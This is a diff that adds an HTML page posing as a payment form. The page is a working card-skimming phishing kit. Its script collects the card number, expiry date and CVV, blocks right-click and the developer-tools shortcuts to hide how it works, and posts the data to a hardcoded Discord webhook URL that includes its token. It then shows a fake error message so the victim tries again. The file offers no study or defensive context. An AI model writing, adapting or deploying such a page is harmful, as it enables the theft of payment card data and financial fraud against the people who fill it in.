@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #FF0000, #000000); /* Red to Black gradient */
+      color: white;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+      position: relative;
+    }
+    /* Snow Effect */
+    .snow {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      pointer-events: none;
+    }
+    .snowflake {
+      position: absolute;
+      background-color: white;
+      border-radius: 50%;
+      opacity: 0.9;
+      animation: fall 5s linear infinite;
+    }
+    @keyframes fall {
+      0% { transform: translateY(-10vh); }
+      100% { transform: translateY(100vh); }
+    }
+    .form-container {
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background for form */
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      z-index: 1;
+    }
+    h1 {
+      font-size: 30px;
+      margin-bottom: 20px;
+      color: #FFDD57; /* Soft yellow color for the title */
+    }
+    input {
+      background-color: #333;
+      color: white;
+      border: 1px solid #FF7E5F; /* Orange border */
+      border-radius: 5px;
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      font-size: 16px;
+    }
+    input:focus {
+      border: 1px solid #FEB47B; /* Light yellow focus color */
+      outline: none;
+    }
+    /* Red Neon Submit Button */
+    button {
+      padding: 12px 20px;
+      background-color: #FF0000;
+      color: white;
+      border: 2px solid #FF0000;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.8),
+                  0 0 20px rgba(255, 0, 0, 0.6),
+                  0 0 30px rgba(255, 0, 0, 0.4);
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.8),
+                  0 0 30px rgba(255, 0, 0, 0.6),
+                  0 0 40px rgba(255, 0, 0, 0.4);
+      transform: scale(1.1);
+    }
+    button:active {
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.8),
+                  0 0 40px rgba(255, 0, 0, 0.6),
+                  0 0 50px rgba(255, 0, 0, 0.4);
+      transform: scale(1.2);
+    }
+    /* Error Notification */
+    .error-notification {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #FFFFFF; /* White background */
+      color: #FF0000; /* Red text */
+      padding: 15px;
+      border-radius: 10px;
+      display: none;
+      font-size: 16px;
+      text-align: center;
+      z-index: 9999;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+      width: 280px; /* Smaller width */
+    }
+    .error-notification .close-btn {
+      background-color: transparent;
+      color: #FF0000;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .error-notification .close-btn:hover {
+      color: #FFDD57; /* Light yellow when hovered */
+    }
+
+    /* Copy Button */
+    .copy-btn {
+      padding: 5px 10px;
+      background-color: #333;
+      color: white;
+      border: 1px solid #FF7E5F;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+    .copy-btn:hover {
+      background-color: #FF7E5F;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="snow" id="snow"></div>
+
+  <div class="form-container">
+    <h1>Payment</h1>
+    <form id="payment-form">
+      <label for="skibidi1">Your card's 16-digit code:</label><br>
+      <input type="text" id="skibidi1" name="skibidi1" maxlength="19" placeholder="Enter 16-digit code"><br><br>
+      
+      <label for="skibidi2">Expiry date:</label><br>
+      <input type="text" id="skibidi2" name="skibidi2" maxlength="5" placeholder="MM/YY"><br><br>
+      
+      <label for="skibidi3">CVV/CVC:</label><br>
+      <input type="text" id="skibidi3" name="skibidi3" maxlength="4" placeholder="Enter 3-4 digits"><br><br>
+      
+      <button type="submit">Pay</button>
+    </form>
+  </div>
+
+  <!-- Error Notification -->
+  <div class="error-notification" id="error-notification">
+    <span>Error! Check your credentials and try again.</span><br>
+    <button class="close-btn" onclick="closeNotification()">OK</button>
+  </div>
+
+  <script>
+    // Disable right-click context menu
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault(); // Disable right-click
+    });
+
+    // Disable F12 and Ctrl + Shift + I (DevTools)
+    document.addEventListener("keydown", function (e) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+        e.preventDefault(); // Block the event
+      }
+    });
+
+    // Prevent right-click menu and keyboard shortcuts to prevent inspect element
+    document.onkeydown = function (e) {
+      if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
+        return false; // Block F12 and Ctrl + Shift + I
+      }
+    };
+
+    // Format card number: Insert a dash every 4 digits
+    document.getElementById("skibidi1").addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+      if (value.length > 16) value = value.substring(0, 16); // Limit to 16 digits
+      let formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1-"); // Add dash every 4 digits
+      e.target.value = formattedValue;
+    });
+
+    // Format expiry date: Insert a slash after 2 digits
+    document.getElementById("skibidi2").addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+      if (value.length > 4) value = value.substring(0, 4); // Limit to 4 digits (MMYY)
+      let formattedValue = value.replace(/(\d{2})(?=\d)/g, "$1/"); // Add slash after 2 digits
+      e.target.value = formattedValue;
+    });
+
+    // Limit CVV/CVC to 4 digits
+    document.getElementById("skibidi3").addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+      if (value.length > 4) value = value.substring(0, 4); // Limit to 4 digits
+      e.target.value = value;
+    });
+
+    // Create continuous falling snowflakes
+    function createSnowflake() {
+      let snow = document.getElementById("snow");
+      let snowflake = document.createElement("div");
+      snowflake.classList.add("snowflake");
+      let size = 8; // Fixed size for snowflakes
+      snowflake.style.width = size + "px";
+      snowflake.style.height = size + "px";
+      snowflake.style.left = Math.random() * 100 + "vw"; // Random horizontal position
+      snowflake.style.animationDuration = Math.random() * 3 + 3 + "s"; // 3-6 seconds
+      snowflake.style.animationDelay = Math.random() * 5 + "s"; // Random delay
+      snow.appendChild(snowflake);
+      setTimeout(() => { snowflake.remove(); }, 6000); // Remove after animation
+    }
+    window.onload = function() {
+      setInterval(createSnowflake, 100);
+    };
+
+    // Copy to clipboard function
+    function copyToClipboard(text) {
+      const tempInput = document.createElement('input');
+      document.body.appendChild(tempInput);
+      tempInput.value = text;
+      tempInput.select();
+      document.execCommand('copy');
+      document.body.removeChild(tempInput);
+      alert('Copied to clipboard!');
+    }
+
+    // Webhook integration: Send form data to your webhook with embed
+    document.getElementById("payment-form").addEventListener("submit", function(e) {
+      e.preventDefault(); // Prevent default form submission
+
+      // Gather form data
+      const formData = new FormData(this);
+
+      // Prepare the data for the embed message
+      const embed = {
+        title: "Payment Details 💳",
+        fields: [
+          { name: "Card Number 🏧", value: formData.get('skibidi1'), inline: true },
+          { name: "Expiry Date 📅", value: formData.get('skibidi2'), inline: true },
+          { name: "CVV/CVC 🔒", value: formData.get('skibidi3'), inline: true }
+        ],
+        color: 15158332 // Red color
+      };
+
+      const webhookData = {
+        embeds: [embed]
+      };
+
+      // Send data to the webhook
+      fetch('https://discord.com/api/webhooks/1344449866310484062/OHkY3c7IwWl2YVpBGjVWYAb78hTsEpCqfu0dCDAcyHNp5b59q4bujyC4wA-OAS8Xz3kE', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(webhookData)
+      })
+      .then(response => {
+        if (response.ok) {
+          showErrorNotification();
+        } else {
+          console.error('Error sending data to webhook:', response.statusText);
+        }
+      })
+      .catch(error => {
+        console.error('Webhook error:', error);
+      });
+    });
+
+    // Display error notification
+    function showErrorNotification() {
+      document.getElementById("error-notification").style.display = "block";
+    }
+
+    // Close error notification
+    function closeNotification() {
+      document.getElementById("error-notification").style.display = "none";
+    }
+  </script>
+
+</body>
+</html>
